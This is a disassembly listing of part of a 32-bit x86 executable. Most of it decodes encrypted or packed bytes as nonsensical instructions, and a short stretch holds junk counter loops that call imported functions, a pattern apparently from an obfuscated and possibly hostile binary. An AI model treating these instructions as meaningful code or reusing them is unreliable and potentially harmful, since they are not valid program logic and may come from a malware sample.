  401827:	imul   esi,DWORD PTR [ecx+0x59065391],0xaf2953d9
  401831:	dec    edi
  401833:	popa   
  401834:	sbb    dh,BYTE PTR [ebp-0xc371653]
  40183a:	lods   eax,DWORD PTR ds:[esi]
  40183b:	push   ds
  40183c:	bound  eax,QWORD PTR [edx]
  40183e:	mov    al,0x77
  401840:	sub    ecx,edx
  401842:	xor    eax,0xa306868a
  401847:	jp     0x4017cb
  401849:	mov    dh,0xd2
  40184b:	(bad)  
  40184c:	lds    ecx,FWORD PTR [ebx+0x758d322f]
  401852:	dec    ebp
  401853:	jmp    0x4018ac
  401855:	mov    DWORD PTR [esi+0x28],esi
  401858:	xlat   BYTE PTR ds:[ebx]
  401859:	lea    edi,[ebx-0x52]
  40185c:	pop    esp
  40185d:	push   edx
  40185e:	mov    gs,WORD PTR [esi+0x5e]
  401861:	and    al,0x49
  401863:	(bad)  
  401864:	in     eax,dx
  401865:	popf   
  401866:	ja     0x4018dd
  401868:	add    dl,BYTE PTR [edx]
  40186a:	mov    dh,bl
  40186c:	sbb    al,0xd
  40186e:	xor    esp,DWORD PTR [ecx+0x29c91bd5]
  401874:	jle    0x401837
  401876:	jmp    0x46a6c980
  40187b:	dec    eax
  40187c:	add    BYTE PTR [ecx-0x28f287be],ah
  401882:	cmc    
  401883:	into   
  401884:	and    eax,0xa0511684
  401889:	add    BYTE PTR [esi+0x51],bh
  40188c:	or     DWORD PTR [eax],edi
  40188e:	add    esp,0x34
  401891:	or     dl,BYTE PTR [ebp-0xd]
  401894:	ss sub esi,esi
  401897:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401898:	repnz out 0xb1,al
  40189b:	sbb    edi,DWORD PTR [eax]
  40189d:	hlt    
  40189e:	push   ebx
  40189f:	shl    DWORD PTR [ecx+0x707d03d9],1
  4018a5:	(bad)  
  4018a7:	inc    edx
  4018a8:	ror    BYTE PTR [edx-0x58c63011],0xeb
  4018af:	fs ja  0x401912
  4018b2:	fcomp  QWORD PTR [ebp+ebp*8-0x42b85a01]
  4018b9:	pop    es
  4018ba:	or     DWORD PTR [eax-0x38fc36c4],edx
  4018c0:	and    DWORD PTR ds:0x433837,0x0
  4018ca:	jmp    0x4018dc
  4018cf:	mov    ebx,DWORD PTR ds:0x433837
  4018d5:	inc    ebx
  4018d6:	mov    DWORD PTR ds:0x433837,ebx
  4018dc:	cmp    DWORD PTR ds:0x433837,0x1c
  4018e3:	jae    0x401910
  4018e9:	cmp    DWORD PTR ds:0x433837,0x23
  4018f0:	jne    0x401901
  4018f6:	push   0x6ff2
  4018fb:	call   DWORD PTR ds:0x41228c
  401901:	jmp    0x4018cf
  401906:	mov    DWORD PTR ds:0x43382b,0x436b
  401910:	mov    DWORD PTR [ebp-0x38],eax
  401913:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40191a:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401921:	or     DWORD PTR ds:0x433777,edx
  401927:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40192e:	add    eax,DWORD PTR ds:0x43376b
  401934:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40193b:	xor    DWORD PTR ds:0x43382f,ecx
  401941:	mov    eax,DWORD PTR [ebp-0x10]
  401944:	xor    ebx,DWORD PTR ds:0x4337f3
  40194a:	xor    eax,esi
  40194c:	add    eax,edi
  40194e:	mov    DWORD PTR [ebp-0xc],eax
  401951:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401958:	sbb    ebx,ebx
  40195a:	mov    BYTE PTR [ebp-0x11],0x67
  40195e:	sub    DWORD PTR ds:0x433767,0x1011
  401968:	mov    eax,DWORD PTR [ebp-0x10]
  40196b:	xor    eax,esi
  40196d:	add    eax,edi
  40196f:	sbb    DWORD PTR ds:0x433733,0x6b1e
  401979:	mov    DWORD PTR [ebp-0xc],eax
  40197c:	mov    eax,DWORD PTR [ebp-0x3c]
  40197f:	xor    eax,esi
  401981:	xor    DWORD PTR ds:0x43376f,0x46ad
  40198b:	add    eax,edi
  40198d:	mov    DWORD PTR [ebp-0x34],eax
  401990:	mov    eax,DWORD PTR [ebp-0x44]
  401993:	mov    DWORD PTR ds:0x433767,0x12
  40199d:	cmp    DWORD PTR ds:0x433767,0x0
  4019a4:	je     0x4019f8
  4019aa:	cmp    DWORD PTR ds:0x433767,0x7
  4019b1:	jne    0x4019c2
  4019b7:	push   0x433867
  4019bc:	call   DWORD PTR ds:0x4121b8
  4019c2:	cmp    DWORD PTR ds:0x433767,0x8
  4019c9:	jne    0x4019dc
  4019cf:	mov    ebx,DWORD PTR ds:0x433767
  4019d5:	dec    ebx
  4019d6:	mov    DWORD PTR ds:0x433767,ebx
  4019dc:	mov    ebx,DWORD PTR ds:0x433767
  4019e2:	dec    ebx
  4019e3:	mov    DWORD PTR ds:0x433767,ebx
  4019e9:	jmp    0x40199d
  4019ee:	and    DWORD PTR ds:0x433713,0x446b
  4019f8:	xor    eax,esi
  4019fa:	add    eax,edi
  4019fc:	not    ebx
  4019fe:	mov    DWORD PTR [ebp-0x30],eax
  401a01:	sub    ebx,DWORD PTR ds:0x4337f7
  401a07:	mov    eax,DWORD PTR [ebp-0x28]
  401a0a:	add    ecx,ecx
  401a0c:	xor    eax,esi
  401a0e:	and    DWORD PTR ds:0x4337eb,0x0
  401a18:	jmp    0x401a2a
  401a1d:	mov    ebx,DWORD PTR ds:0x4337eb
  401a23:	inc    ebx
  401a24:	mov    DWORD PTR ds:0x4337eb,ebx
  401a2a:	cmp    DWORD PTR ds:0x4337eb,0x18
  401a31:	jae    0x401f27
  401a37:	cmp    DWORD PTR ds:0x4337eb,0xa
  401a3e:	jne    0x401a4f
  401a44:	push   0x1a57
  401a49:	call   DWORD PTR ds:0x412350
  401a4f:	cmp    DWORD PTR ds:0x4337eb,0x9
  401a56:	jne    0x401a6b
  401a5c:	xor    ebx,ebx
  401a5e:	xor    ebx,DWORD PTR ds:0x4337eb
  401a64:	inc    ebx
  401a65:	mov    DWORD PTR ds:0x4337eb,ebx
  401a6b:	jmp    0x401a1d
  401a70:	mov    DWORD PTR ds:0x433717,0x13
  401a7a:	cmp    DWORD PTR ds:0x433717,0x0
  401a81:	je     0x401f27
  401a87:	cmp    DWORD PTR ds:0x433717,0xa
  401a8e:	jne    0x401a9f
  401a94:	push   0x764e
  401a99:	call   DWORD PTR ds:0x412290
  401a9f:	cmp    DWORD PTR ds:0x433717,0xb
  401aa6:	jne    0x401abb
  401aac:	xor    ecx,ecx
  401aae:	xor    ecx,DWORD PTR ds:0x433717
  401ab4:	dec    ecx
  401ab5:	mov    DWORD PTR ds:0x433717,ecx
  401abb:	mov    ecx,DWORD PTR ds:0x433717
  401ac1:	dec    ecx
  401ac2:	mov    DWORD PTR ds:0x433717,ecx
  401ac8:	jmp    0x401a7a
  401acd:	and    DWORD PTR ds:0x433777,0x0
  401ad7:	jmp    0x401ae9
  401adc:	mov    ecx,DWORD PTR ds:0x433777
  401ae2:	inc    ecx
  401ae3:	mov    DWORD PTR ds:0x433777,ecx
  401ae9:	cmp    DWORD PTR ds:0x433777,0x1c
  401af0:	jae    0x401f27
  401af6:	cmp    DWORD PTR ds:0x433777,0x1d
  401afd:	jne    0x401b0e
  401b03:	push   0x3c99
  401b08:	call   DWORD PTR ds:0x412294
  401b0e:	jmp    0x401adc
  401b13:	xor    DWORD PTR ds:0x433777,ecx
  401b19:	jmp    0x401f27
  401b1e:	mov    cl,0x40
  401b20:	(bad)  
  401b21:	mul    DWORD PTR es:[ecx+0x73ea5171]
  401b28:	cmp    edx,DWORD PTR [ebx+0x6]
  401b2b:	mov    ecx,0x795c3f83
  401b30:	jle    0x401bb0
  401b32:	outs   dx,DWORD PTR ds:[esi]
  401b33:	jge    0x401bb3
  401b35:	jle    0x401b1c
  401b37:	mov    ebp,0xf568dfce
  401b3c:	shl    DWORD PTR [ebx-0x74],cl
  401b3f:	mov    cl,0xed
  401b41:	add    eax,0x7151edee
  401b46:	add    DWORD PTR [ebp-0x56427db9],eax
  401b4c:	stos   DWORD PTR es:[edi],eax
  401b4d:	pop    ebx
  401b4e:	fsubp  st(5),st
  401b50:	xor    eax,0x955501
  401b55:	mov    eax,0x623332f3
  401b5a:	inc    edi
  401b5b:	dec    ebx
  401b5c:	xor    al,BYTE PTR [esi]
  401b5e:	mov    dh,0x8f
  401b60:	icebp  
  401b61:	mov    cl,0xfe
  401b63:	pop    DWORD PTR [ebx+0x2c]
  401b66:	push   esi
  401b67:	mov    ah,0x58
  401b69:	add    al,0x19
  401b6b:	cmp    al,0xb9
  401b6d:	xchg   ecx,eax
  401b6e:	cmc    
  401b6f:	cmp    al,0xe9
  401b71:	mov    cl,0x77
  401b73:	inc    ebx
  401b74:	push   esp
  401b75:	retf   
  401b76:	test   al,0xaf
  401b78:	call   0x57d290fa
  401b7d:	and    eax,0xcc9e67bc
  401b82:	lea    ecx,[edi-0x6bf711f3]
  401b88:	xor    eax,0xdcd21be8
  401b8d:	imul   edx,DWORD PTR ds:0x2a629ee0,0xffffffdd
  401b94:	jecxz  0x401b3e
  401b96:	and    al,0x3b
  401b98:	cmp    BYTE PTR [edx+0x625e5f17],al
  401b9e:	(bad)  
  401ba0:	cmp    al,0x3d
  401ba2:	push   ebp
  401ba3:	scas   eax,DWORD PTR es:[edi]
  401ba4:	add    eax,eax
  401ba6:	add    eax,0xaf7a3347
  401bab:	out    dx,eax
  401bac:	cmp    eax,DWORD PTR [esi+0x70]
  401baf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401bb0:	lea    ebx,[ecx+0x2f]
  401bb3:	pop    eax
  401bb4:	call   0x46ae:0xc11cca47
  401bbb:	add    edx,ebp
  401bbd:	ss dec esi
  401bbf:	mov    bh,0xf1
  401bc1:	sbb    al,0x20
  401bc3:	mov    ebp,0x4a46629a
  401bc8:	cmp    esp,DWORD PTR [edi]
  401bca:	mov    cs,WORD PTR [eax-0x772a31ad]
  401bd0:	bound  edx,QWORD PTR [esi]
  401bd2:	enter  0x80ec,0x69
  401bd6:	or     DWORD PTR [ecx],edx
  401bd8:	js     0x401b88
  401bda:	mov    esp,0xa69fa114
  401bdf:	mov    ecx,0x95ffe37e
  401be4:	or     BYTE PTR [ecx-0x77],al
  401be7:	mov    dl,0x38
  401be9:	cld    
  401bea:	arpl   WORD PTR [ebp+0x73],di
  401bed:	xchg   ebp,eax
  401bee:	jp     0x401c2c
  401bf0:	test   BYTE PTR [ecx],0x76
  401bf3:	mov    al,ds:0xc428fc81
  401bf8:	add    BYTE PTR [edi-0x4df97ae9],bh
  401bfe:	cs xor eax,0x1e4171ec
  401c04:	stc    
  401c05:	lock inc edi
  401c07:	xchg   esi,eax
  401c08:	adc    bl,dh
  401c0a:	arpl   WORD PTR [eax+esi*4-0x2e],bp
  401c0e:	addr16 push edx
  401c10:	inc    esi
  401c11:	xor    al,0x4b
  401c13:	je     0x401c7e
  401c15:	data16 cmc 
  401c17:	xor    DWORD PTR [esi],esi
  401c19:	pushf  
  401c1a:	push   edx
  401c1b:	lods   al,BYTE PTR ds:[esi]
  401c1c:	clc    
  401c1d:	mov    bl,0x62
  401c1f:	(bad)  
  401c20:	mov    dh,BYTE PTR [eax-0x30c94b12]
  401c26:	imul   eax,DWORD PTR [eax-0x66],0x7f
  401c2a:	sub    BYTE PTR [ebp-0x60c9d2a9],bh
  401c30:	mov    edx,0xfbc2bfd8
  401c35:	jge    0x401c63
  401c37:	in     eax,dx
  401c38:	fmulp  st(2),st
  401c3a:	xor    esi,DWORD PTR [ecx-0x65de5d7f]
  401c40:	in     al,dx
  401c41:	mov    esp,0xbaf4fa02
  401c46:	cwde   
  401c47:	sub    eax,0x3f57a860
  401c4c:	out    dx,al
  401c4d:	enter  0xf42a,0x22
  401c51:	jnp    0x401c91
  401c53:	std    
  401c54:	jg     0x401cb7
  401c56:	add    esp,DWORD PTR [ebx+0x1a15238e]
  401c5c:	inc    ecx
  401c5d:	aas    
  401c5e:	call   0xd989:0xf6b176c9
  401c65:	int3   
  401c66:	inc    esp
  401c67:	pop    ss
  401c68:	jmp    0x9c84:0x8e5c14c3
  401c6f:	add    DWORD PTR [eax],edi
  401c71:	ret    
  401c72:	and    ebx,ebp
  401c74:	or     DWORD PTR [edi+0x485bb575],edx
  401c7a:	xchg   BYTE PTR ss:[eax],ah
  401c7d:	or     cl,BYTE PTR [ebp+0x2a]
  401c80:	mov    ds:0xd276b26c,eax
  401c85:	aam    0x14
  401c87:	ins    BYTE PTR es:[edi],dx
  401c88:	cmp    ecx,DWORD PTR [ebx]
  401c8a:	ss imul edi,esp,0x1a90c59c
  401c91:	daa    
  401c92:	clc    
  401c93:	push   ecx
  401c94:	nop
  401c95:	push   es
  401c96:	nop
  401c97:	mov    ah,0xdf
  401c99:	hlt    
  401c9a:	add    al,0x18
  401c9c:	les    edi,FWORD PTR [edx*4+0x67a21fff]
  401ca3:	jmp    0x401c50
  401ca5:	adc    eax,0x5593ae7e
  401caa:	xor    esp,DWORD PTR [ebx-0x6685781f]
  401cb0:	ror    BYTE PTR [eax+0x491e2514],1
  401cb6:	jmp    0x609de3a2
  401cbb:	xchg   BYTE PTR [esi],ah
  401cbd:	add    BYTE PTR [eax+0x6d38de51],dh
  401cc3:	out    0x91,al
  401cc5:	popf   
  401cc6:	es xor dh,ah
  401cc9:	sar    dl,0x9f
  401ccc:	fcmovbe st,st(5)
  401cce:	stc    
  401ccf:	mov    dh,0xbb
  401cd1:	bound  esi,QWORD PTR [esi+ebx*2-0x3a109dac]
  401cd8:	in     eax,0x2b
  401cda:	sub    DWORD PTR [ecx+0x6a225efd],edi
  401ce0:	sbb    eax,esi
  401ce2:	iret   
  401ce3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ce4:	mov    ecx,0x1a44bb86
  401ce9:	cwde   
  401cea:	pop    ebx
  401ceb:	pop    ss
  401cec:	push   ecx
  401ced:	repz lock out 0x5a,eax
  401cf1:	xchg   edx,eax
  401cf2:	js     0x401c8a
  401cf4:	test   al,0x3e
  401cf6:	pusha  
  401cf7:	mov    ds:0xb9f35318,eax
  401cfc:	pusha  
  401cfd:	mov    bl,0xf8
  401cff:	mov    ebp,ebp
  401d01:	cmp    DWORD PTR ds:0x52c06021,eax
  401d07:	xchg   ebp,eax
  401d08:	leave  
  401d09:	and    al,0x75
  401d0b:	mov    bh,0x7e
  401d0d:	ds inc edx
  401d0f:	sahf   
  401d10:	xchg   DWORD PTR [ecx],ebx
  401d12:	es mov ecx,0xc953b034
  401d18:	call   0xc20c:0xf9175134
  401d1f:	xlat   BYTE PTR cs:[ebx]
  401d21:	push   0xd5f0c60f
  401d26:	push   esp
  401d27:	fld    QWORD PTR [esp+edx*8-0x9b9d6f7]
  401d2e:	mov    esi,DWORD PTR [esi]
  401d30:	sti    
  401d31:	push   ebp
  401d32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d33:	data16 mov ?,WORD PTR [edi-0x4c6f32bc]
  401d3a:	push   ss
  401d3b:	mov    ecx,0x569f1b0a
  401d40:	push   ecx
  401d41:	push   cs
  401d42:	inc    ecx
  401d43:	xor    eax,0xa0bea8b3
  401d48:	clc    
  401d49:	cmc    
  401d4a:	inc    esp
  401d4b:	cmp    BYTE PTR [esi+eax*4-0xf],al
  401d4f:	sub    eax,ebx
  401d51:	push   ebx
  401d52:	xchg   esi,eax
  401d53:	(bad)  
  401d54:	into   
  401d55:	cmp    al,0xc8
  401d57:	lods   al,BYTE PTR ds:[esi]
  401d58:	push   edx
  401d59:	dec    eax
  401d5a:	out    dx,al
  401d5b:	repz add BYTE PTR [ebx],ah
  401d5e:	mov    esi,0x22a97de6
  401d63:	(bad)  
  401d64:	retf   
  401d65:	jne    0x401dcd
  401d67:	jp     0x401d1c
  401d69:	xchg   esp,eax
  401d6a:	pop    edi
  401d6b:	sbb    eax,0x37c124c4
  401d70:	mov    ds:0x7a0b3e27,al
  401d75:	cdq    
  401d76:	jno    0x401dd8
  401d78:	pop    ds
  401d79:	rol    bh,1
  401d7b:	imul   ecx,DWORD PTR [edx],0xffffff89
  401d7e:	fwait
  401d7f:	scas   al,BYTE PTR es:[edi]
  401d80:	ss dec eax
  401d82:	push   ds
  401d83:	lods   al,BYTE PTR ds:[esi]
  401d84:	scas   al,BYTE PTR es:[di]
  401d86:	push   DWORD PTR ds:[eax-0x5465605c]
  401d8d:	mov    cl,0xee
  401d8f:	ret    
  401d90:	cmp    DWORD PTR [ebx],esi
  401d92:	pop    esp
  401d93:	jne    0x401db7
  401d95:	push   esi
  401d96:	lods   eax,DWORD PTR ds:[esi]
  401d97:	fild   QWORD PTR [ebx]
  401d99:	ret    
  401d9a:	and    ecx,DWORD PTR [ecx+0x21]
  401d9d:	and    al,0x2e
  401d9f:	aad    0xb3
  401da1:	leave  
  401da2:	mov    es,WORD PTR [eax]
  401da4:	dec    eax
  401da5:	mov    al,0x58
  401da7:	and    edi,DWORD PTR [esi-0x19]
  401daa:	aam    0x12
  401dac:	mov    ebx,0x3115843e
  401db1:	cs inc edx
  401db3:	push   esp
  401db4:	repnz pushf 
  401db6:	(bad)
  401db9:	test   DWORD PTR ds:0x130d69e6,ebx
  401dbf:	int    0x7a
  401dc1:	mov    DWORD PTR [edx-0x2305bd99],esi
  401dc7:	xchg   esi,eax
  401dc8:	ficom  WORD PTR [ecx-0x55]
  401dcb:	cld    
  401dcc:	ds jg  0x401dfa
  401dcf:	jmp    0x38ed:0x57ac74fb
  401dd6:	mov    eax,0x65a9df9c
  401ddb:	sub    eax,0x4cf6105d
  401de0:	xchg   esi,eax
  401de1:	mov    dl,0x89
  401de3:	dec    esp
  401de4:	lods   eax,DWORD PTR ds:[esi]
  401de5:	lods   al,BYTE PTR ds:[esi]
  401de6:	inc    ebx
  401de7:	cli    
  401de8:	jle    0x401db2
  401dea:	xchg   edi,eax
  401deb:	inc    eax
  401dec:	lds    edx,FWORD PTR [esi-0x2e]
  401def:	cwde   
  401df0:	icebp  
  401df1:	in     eax,0x38
  401df3:	push   es
  401df4:	pop    eax
  401df5:	enter  0x2af9,0x17
  401df9:	push   es
  401dfa:	xchg   cl,bh
  401dfc:	stos   DWORD PTR es:[edi],eax
  401dfd:	push   edi
  401dfe:	mov    eax,0xf03e0005
  401e03:	or     cl,BYTE PTR [edx+0x2d]
  401e06:	fadd   QWORD PTR [ecx+0x75ee128e]
  401e0c:	iret   
  401e0d:	add    al,0x7b
  401e0f:	add    al,0xf3
  401e11:	sub    esi,edx
  401e13:	pop    es
  401e14:	sbb    DWORD PTR [eax-0x3a],0x190bf021
  401e1b:	adc    cl,al
  401e1d:	dec    edi
  401e1e:	and    esp,DWORD PTR [ecx]
  401e20:	pop    eax
  401e21:	sub    BYTE PTR [eax+0x306ae4ca],bh
  401e27:	aas    
  401e28:	dec    eax
  401e29:	push   es
  401e2a:	mov    esi,0x86246cd5
  401e2f:	xchg   esp,eax
  401e30:	mov    gs,WORD PTR [edx+0x75798083]
  401e36:	popf   
  401e37:	ins    BYTE PTR es:[edi],dx
  401e38:	mov    edx,0xa636eccf
  401e3d:	pop    ecx
  401e3e:	or     al,BYTE PTR [eax-0x7f0ad09c]
  401e44:	ins    DWORD PTR es:[edi],dx
  401e45:	das    
  401e46:	int    0x1d
  401e48:	arpl   WORD PTR [esi-0x38921b79],si
  401e4e:	mov    ?,WORD PTR [esi-0x31]
  401e51:	ss pop edx
  401e53:	inc    esp
  401e54:	mov    al,ds:0xcf70a9a1
  401e59:	iret   
  401e5a:	add    al,0x40
  401e5c:	cld    
  401e5d:	and    al,0xab
  401e5f:	test   DWORD PTR [edi],ebx
  401e61:	add    DWORD PTR [edx],ebx
  401e63:	adc    al,0x9d
  401e65:	xor    BYTE PTR ds:0x36b945e6,0x4b
  401e6c:	enter  0x7e93,0xf5
  401e70:	pop    es
  401e71:	add    DWORD PTR [esi],esi
  401e73:	mov    ecx,0x4e8e3711
  401e78:	mov    ds:0xa5ee3a18,eax
  401e7d:	out    dx,al
  401e7e:	fadd   st,st(6)
  401e80:	in     eax,dx
  401e81:	dec    edi
  401e82:	stc    
  401e83:	sti    
  401e84:	outs   dx,DWORD PTR ds:[esi]
  401e85:	xor    cl,BYTE PTR [ebp+eiz*8+0x53]
  401e89:	cmc    
  401e8a:	jno    0x401ef0
  401e8c:	push   ss
  401e8d:	(bad)  
  401e8e:	cwde   
  401e8f:	es inc ebx
  401e91:	sahf   
  401e92:	inc    ebx
  401e93:	fadd   st(6),st
  401e95:	and    ebx,ecx
  401e97:	and    eax,0x31549875
  401e9c:	adc    BYTE PTR [eax],dl
  401e9e:	aaa    
  401e9f:	push   cs
  401ea0:	xchg   ecx,eax
  401ea1:	test   esp,0xe3591b2c
  401ea7:	ret    0x7a7e
  401eaa:	mov    ah,0xe0
  401eac:	sub    BYTE PTR [esi-0x5d0049b9],dh
  401eb2:	call   0x9faeb9b4
  401eb7:	pop    edx
  401eb8:	icebp  
  401eb9:	dec    esi
  401eba:	arpl   WORD PTR [esi],sp
  401ebc:	mov    bl,0xc7
  401ebe:	sub    eax,0x547818b6
  401ec3:	xor    ebp,DWORD PTR [eax+0x3fd41ef2]
  401ec9:	xor    al,0xd
  401ecb:	pushf  
  401ecc:	rcl    DWORD PTR [eax],0x1e
  401ecf:	jno    0x401eca
  401ed1:	inc    edx
  401ed2:	fwait
  401ed3:	xor    al,BYTE PTR [ebx]
  401ed5:	in     al,0x51
  401ed7:	or     dh,ch
  401ed9:	std    
  401eda:	and    cl,BYTE PTR [edi+0x7e83c943]
  401ee0:	or     bh,ah
  401ee2:	push   esp
  401ee3:	(bad)  
  401ee4:	push   eax
  401ee5:	test   al,0xb9
  401ee7:	ss dec ebp
  401ee9:	inc    edx
  401eea:	push   edi
  401eeb:	jmp    0x401e80
  401eed:	xchg   esi,eax
  401eee:	sahf   
  401eef:	or     BYTE PTR [ecx+0xb2255d7],0xba
  401ef6:	jo     0x401f25
  401ef8:	push   es
  401ef9:	pop    ds
  401efa:	add    al,0xd9
  401efc:	enter  0x5678,0x51
  401f00:	pop    ds
  401f01:	popf   
  401f02:	cmp    eax,0x80b66c45
  401f07:	aam    0x6d
  401f09:	dec    ebx
  401f0a:	xchg   ebp,eax
  401f0b:	jns    0x401f2c
  401f0d:	lds    ebx,FWORD PTR cs:[esi-0x114d7a9f]
  401f14:	xchg   DWORD PTR [edi+0x73],edx
  401f17:	and    BYTE PTR [ebx+0x14],0xdb
  401f1b:	sahf   
  401f1c:	(bad)  
  401f1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f1e:	xor    eax,DWORD PTR [ecx+0x78fab97b]
  401f24:	or     DWORD PTR [eax-0x7438fc2b],ecx
  401f2a:	sbb    eax,0x43380b
  401f2f:	mov    ecx,DWORD PTR ds:0x433857
  401f35:	sub    ecx,ebx
  401f37:	add    ebx,DWORD PTR [ebx+ecx*1]
  401f3a:	mov    DWORD PTR [ebp-0x2c],eax
  401f3d:	mov    ebx,DWORD PTR ds:0x433847
  401f43:	mov    ebx,DWORD PTR [ebx]
  401f45:	xor    DWORD PTR ds:0x43371b,ebx
  401f4b:	jmp    0x402359
  401f50:	lahf   
  401f51:	in     al,dx
  401f52:	leave  
  401f53:	dec    DWORD PTR [ecx-0x65]
  401f56:	imul   ebp,esp,0xaa49c393
  401f5c:	inc    edx
  401f5d:	xchg   esp,eax
  401f5e:	stos   DWORD PTR es:[edi],eax
  401f5f:	adc    BYTE PTR [ebp+0x5],cl
  401f62:	jle    0x401fe2
  401f64:	outs   dx,DWORD PTR ds:[esi]
  401f65:	jge    0x401fe5
  401f67:	jle    0x401fbc
  401f69:	aad    0xcf
  401f6b:	push   edx
  401f6c:	in     eax,0x64
  401f6e:	std    
  401f6f:	outs   dx,BYTE PTR ds:[esi]
  401f70:	iret   
  401f71:	sbb    eax,0x459d35f9
  401f76:	jl     0x401fec
  401f78:	xlat   BYTE PTR ds:[ebx]
  401f79:	test   al,0xac
  401f7b:	adc    ch,0xd1
  401f7e:	or     ecx,ecx
  401f80:	call   FWORD PTR [ecx-0x46f89abf]
  401f86:	ret    
  401f87:	mov    ?,WORD PTR [esi]
  401f89:	scas   eax,DWORD PTR es:[edi]
  401f8a:	sbb    BYTE PTR [esi+0x72],ch
  401f8d:	mov    ss,WORD PTR [esp-0x3c5e2b27]
  401f94:	add    dh,BYTE PTR [ecx-0x7c]
  401f97:	retf   0x299f
  401f9a:	xlat   BYTE PTR ds:[ebx]
  401f9b:	out    dx,eax
  401f9c:	mov    bh,0x7c
  401f9e:	cmp    edx,DWORD PTR [edi+0x3cdb190b]
  401fa4:	or     DWORD PTR [edi-0xd0f8b82],esi
  401faa:	jecxz  0x401f92
  401fac:	cdq    
  401fad:	mov    ds:0x98433ea9,al
  401fb2:	jmp    DWORD PTR [ebp+0x1e]
  401fb5:	test   al,0x62
  401fb7:	sbb    al,0x80
  401fb9:	push   edi
  401fba:	into   
  401fbb:	xchg   ebp,eax
  401fbc:	ins    DWORD PTR es:[edi],dx
  401fbd:	or     bl,BYTE PTR [edi-0x27]
  401fc0:	sbb    edi,DWORD PTR [esi]
  401fc2:	jnp    0x402022
  401fc4:	mov    DWORD PTR [edi-0x35],ecx
  401fc7:	xchg   ebx,eax
  401fc8:	dec    ebx
  401fc9:	jno    0x401faa
  401fcb:	add    DWORD PTR ds:0x3512db4c,0x61
  401fd2:	mov    bh,0x6
  401fd4:	call   0x16ba:0x1e7bfcaf
  401fdb:	or     ch,BYTE PTR [eax-0x58]
  401fde:	ficom  DWORD PTR [eax-0x14da3c57]
  401fe4:	mov    ?,ebx
  401fe6:	scas   eax,DWORD PTR es:[edi]
  401fe7:	xor    al,0xcd
  401fe9:	sahf   
  401fea:	sbb    al,0x7c
  401fec:	push   0xffffffc8
  401fee:	fisttp DWORD PTR [esi-0xb]
  401ff1:	(bad)
  401ff4:	bound  esi,QWORD PTR fs:[ebx]
  401ff7:	pop    ss
  401ff8:	sbb    al,0x71
  401ffa:	jge    0x402004
  401ffc:	loop   0x402008
  401ffe:	les    ebp,FWORD PTR [esi+edx*8]
  402001:	pop    ebx
  402002:	mov    ds:0x5412da70,al
  402007:	int    0xca
  402009:	xchg   DWORD PTR [eax],edi
  40200b:	cmc    
  40200c:	fnsave [edi+0x79c4fe36]
  402012:	push   0xfffffff6
  402014:	xor    ax,0x1cb6
  402018:	pop    es
  402019:	mov    ch,0x7a
  40201b:	mov    esi,0xb747216d
  402020:	or     al,0xc0
  402022:	mov    WORD PTR [eax+0x1d],fs
  402025:	mov    esp,0x756b02c3
  40202a:	jp     0x402014
  40202c:	loopne 0x401fdc
  40202e:	and    ecx,DWORD PTR [ecx]
  402030:	outs   dx,DWORD PTR ds:[esi]
  402031:	sbb    DWORD PTR [ebp-0x318aa2a0],esp
  402037:	jp     0x402021
  402039:	ss (bad) 
  40203b:	adc    eax,0x46dc951b
  402040:	xor    eax,0xbec7f59f
  402045:	test   al,0x88
  402047:	shl    DWORD PTR [ebx-0x4e0b364f],0xba
  40204e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40204f:	jnp    0x4020a3
  402051:	mov    cl,0x83
  402053:	ds test eax,0x31f2264b
  402059:	jnp    0x40207d
  40205b:	shl    DWORD PTR [eax-0x31022d13],0xec
  402062:	push   cs
  402063:	jns    0x4020dd
  402065:	jge    0x40201b
  402067:	leave  
  402068:	push   ebp
  402069:	push   ebx
  40206a:	push   ss
  40206b:	sbb    edi,DWORD PTR [esi]
  40206d:	xor    BYTE PTR [edi],0x75
  402070:	fld    TBYTE PTR [eax-0xf203359]
  402076:	lar    edi,WORD PTR [edx+esi*1]
  40207a:	call   0xda75:0xf71c8c4b
  402081:	nop
  402082:	inc    esp
  402083:	gs xchg esp,eax
  402085:	push   esp
  402086:	in     eax,0x91
  402088:	add    eax,0xe8401b7d
  40208d:	inc    ecx
  40208e:	and    cl,0x8e
  402091:	xor    al,0x60
  402093:	int    0x4
  402095:	mov    esp,0x22e2972a
  40209a:	in     al,0x1
  40209c:	fcom   QWORD PTR [edi+0x77e271e6]
  4020a2:	stos   BYTE PTR es:[edi],al
  4020a3:	std    
  4020a4:	sbb    al,0x95
  4020a6:	cmp    BYTE PTR [esi],al
  4020a8:	pushf  
  4020a9:	aad    0x48
  4020ab:	lock dec eax
  4020ad:	test   DWORD PTR [edx-0x48],esp
  4020b0:	xor    BYTE PTR [ecx+0x65],cl
  4020b3:	or     ebx,DWORD PTR [edx+edi*2-0x2cfedaf2]
  4020ba:	lods   al,BYTE PTR ds:[esi]
  4020bb:	rol    dl,cl
  4020bd:	mov    eax,0xe5fda71e
  4020c2:	es test al,0x7
  4020c5:	fwait
  4020c6:	pop    ecx
  4020c7:	sbb    DWORD PTR [ecx],esi
  4020c9:	sub    DWORD PTR [eax-0x77],ecx
  4020cc:	mov    ebx,0x26410668
  4020d1:	pusha  
  4020d2:	jmp    0xfa0a48e
  4020d7:	sbb    ah,BYTE PTR [ecx-0x5e]
  4020da:	jmp    0x402075
  4020dc:	pop    ss
  4020dd:	push   esi
  4020de:	adc    al,cl
  4020e0:	dec    esp
  4020e1:	xlat   BYTE PTR ds:[ebx]
  4020e2:	retf   0x6e0a
  4020e5:	div    al
  4020e7:	cmp    al,0x90
  4020e9:	aad    0xaa
  4020eb:	rcr    DWORD PTR [ebp+edi*8-0x77],0x1e
  4020f0:	ins    BYTE PTR es:[edi],dx
  4020f1:	cmp    DWORD PTR [eax+0x56],edx
  4020f4:	(bad)
  4020f8:	mov    esi,0xaa5ea965
  4020fd:	popa   
  4020fe:	push   eax
  4020ff:	jne    0x402134
  402101:	jle    0x40215a
  402103:	mov    esp,0xc3341fd
  402108:	push   ss
